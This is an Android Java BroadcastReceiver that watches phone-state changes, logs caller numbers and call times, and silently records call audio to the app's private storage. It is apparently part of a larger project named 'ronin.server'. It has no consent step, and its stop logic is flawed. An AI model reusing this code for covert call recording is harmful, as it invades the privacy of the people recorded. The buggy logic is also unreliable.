package com.ronin.server;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.media.MediaRecorder;
import android.telephony.TelephonyManager;
import android.util.Log;
import java.io.IOException;
import java.util.Date;

public class MyReceiver extends BroadcastReceiver {

    private MediaRecorder mr = new MediaRecorder();
    private Context context;
    private Intent intent;
    private SharedPreferences sharedPref ;
    private SharedPreferences.Editor geditor;

    @Override
    public void onReceive(Context context, Intent intent) {
        this.context = context;
        this.intent = intent;
        sharedPref = context.getSharedPreferences("CALL_STATE", Context.MODE_PRIVATE);
        geditor = sharedPref.edit();
        try {
            if (intent.getStringExtra(TelephonyManager.EXTRA_STATE).equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
                Log.i("PHONE_STATE", "Call Started...");
                callStarted();
            } else if (intent.getStringExtra(TelephonyManager.EXTRA_STATE).equals(TelephonyManager.EXTRA_STATE_IDLE)) {
                Log.i("PHONE_STATE", "Call ended...");
                callEnded();

            } else if (intent.getStringExtra(TelephonyManager.EXTRA_STATE).equals(TelephonyManager.EXTRA_STATE_RINGING)) {
                Log.i("PHONE_STATE", "Incoming call...");
                ringing();
            }
        } catch (Exception e) {
            Log.i("PHONE_STATE", "Exception Occurred.. ( onReceive ) " + e.toString());
        }

    }

    void ringing() {
        add("ringing");
    }

    void add(String type) {
        String date = new Date().toString();
        String data = getPhoneNumber() + "--" + date + "--" + type;

        SharedPreferences sharedPref = context.getSharedPreferences("CALL_RECORD", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPref.edit();

        editor.putString(date, data);
        editor.apply();
    }

    void add(String type,String path){
        SharedPreferences sharedPref = context.getSharedPreferences("CALL_RECORD_AUDIO", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPref.edit();

        editor.putString(new Date().toString(),path);
        editor.apply();
    }

    void callStarted() {
        geditor.putBoolean("STATE",true).apply();
        startRecord();
    }

    void callEnded() {
        add("ended");
        stopRecord();
    }


    String getPhoneNumber() {
        return intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
    }

    void startRecord() {
        mr.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
        mr.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        mr.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        String path = context.getFilesDir() + "/" + new Date().toString() + ".3gp";
        path= path.replaceAll("\\s", "#");
        path = path.toLowerCase();
        add("lifted",path);
        System.out.println(path);
        mr.setOutputFile(path);
        try {
            mr.prepare();
        } catch (IOException e) {
            e.printStackTrace();
            Log.i("PHONE_STATE", "Exception Occurred.. ( startRecord ) " + e.toString());
        }
        mr.start();
    }

    void stopRecord() {
        if (sharedPref.getBoolean("STATE",false)) {
            mr.stop();
            mr.reset();
            mr.release();
        }
        System.out.println("Invalid Call to STOP !!!!");
    }

}
